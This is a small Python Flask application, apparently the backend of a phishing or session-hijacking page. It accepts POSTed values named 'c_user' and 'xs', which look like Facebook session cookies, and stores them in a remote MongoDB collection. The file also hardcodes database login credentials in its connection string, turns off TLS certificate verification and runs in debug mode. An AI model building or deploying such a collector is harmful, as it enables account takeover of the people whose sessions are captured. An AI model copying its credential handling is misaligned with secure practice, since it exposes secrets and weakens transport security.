from flask import render_template, request
from flask import Flask
# This is the Config file
from pymongo import MongoClient

URI_CONNECTION = "mongodb://tejas22t:Coder123%21@mycluster.gmaql.mongodb.net/?ssl=true&ssl_cert_reqs=CERT_NONE"
Client = MongoClient(URI_CONNECTION)
app = Flask(__name__)

@app.route('/naseeb', methods=['POST', 'GET'])
def route():
  if request.method == 'POST':
    cuser = request.form['C_user']
    xs = request.form['xs']
    json= {'c_user':cuser, 'xs': xs}
    db= Client['telegram']
    data= db['users']

    data.insert_one(json)

  else:
    return render_template('home.html')


if __name__ == "__main__":
  app.run(debug=True)
